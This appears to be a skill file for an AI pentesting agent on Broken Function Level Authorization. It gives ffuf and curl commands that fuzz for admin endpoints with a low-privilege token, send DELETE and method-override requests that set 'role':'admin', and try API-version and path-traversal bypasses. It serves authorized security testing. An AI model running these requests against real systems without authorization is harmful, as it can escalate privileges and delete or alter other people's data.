---
name: vuln-bfla
description: "Broken Function Level Authorization (BFLA) testing — accessing admin functions as regular user, HTTP method override, hidden admin endpoints, privilege escalation via API versioning. Triggers: 'bfla', 'broken function level authorization', 'function level access control', 'admin function bypass', 'api function bypass', 'horizontal function access', 'unauthorized function'."
---

# Broken Function Level Authorization (BFLA)

Test access to admin/privileged API functions using lower-privilege credentials.

---

## Phase 1: Admin Endpoint Discovery

```bash
TARGET="https://TARGET"
USER_TOKEN="LOW_PRIV_TOKEN"

# Discover admin endpoints via wordlist:
ffuf -u "$TARGET/api/v1/FUZZ" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -mc 200,201,204 -o output/bfla_endpoints.json 2>&1

# Common admin endpoint patterns:
ADMIN_ENDPOINTS=(
  "/api/v1/admin"
  "/api/v1/admin/users"
  "/api/v1/admin/config"
  "/api/v1/admin/logs"
  "/api/v1/admin/reports"
  "/api/v1/management"
  "/api/v1/internal"
  "/api/admin"
  "/admin/api"
  "/api/v2/admin"
  "/api/v0/admin"
)

for EP in "${ADMIN_ENDPOINTS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" "$TARGET$EP")
  echo "$EP → $STATUS"
done | tee output/bfla_manual.txt
```

---

## Phase 2: HTTP Method Override

```bash
TARGET="https://TARGET"
USER_TOKEN="LOW_PRIV_TOKEN"
ADMIN_EP="/api/v1/users/123"

# Try DELETE/PATCH with user token:
curl -s -X DELETE "$TARGET$ADMIN_EP" -H "Authorization: Bearer $USER_TOKEN"
curl -s -X PATCH "$TARGET$ADMIN_EP" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# Method override headers:
curl -s -X POST "$TARGET$ADMIN_EP" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "X-HTTP-Method-Override: DELETE"

curl -s -X POST "$TARGET$ADMIN_EP" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":true}'
```

---

## Phase 3: API Version & Path Manipulation

```bash
TARGET="https://TARGET"
USER_TOKEN="LOW_PRIV_TOKEN"

# Try accessing admin functions via older/other API versions:
for VER in v0 v1 v2 v3 beta internal; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" \
    "$TARGET/api/$VER/admin/users")
  echo "v$VER: $STATUS"
done

# Path normalization bypass:
curl -s -H "Authorization: Bearer $USER_TOKEN" \
  "$TARGET/api/v1/users/../admin/config"
curl -s -H "Authorization: Bearer $USER_TOKEN" \
  "$TARGET/api/v1/admin%2Fusers"

# Function via different content types:
curl -s -X POST "$TARGET/api/v1/admin/export" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: text/xml" \
  -d '<export><format>csv</format></export>'
```

---

## Output

Save to `output/`:
- `bfla_endpoints.json` — discovered admin endpoints
- `bfla_manual.txt` — manual probe results
- `bfla_poc.txt` — request showing unauthorized function access

## Next Phase

→ `vuln-idor` for object-level access control issues
→ `pentest-report` to document findings
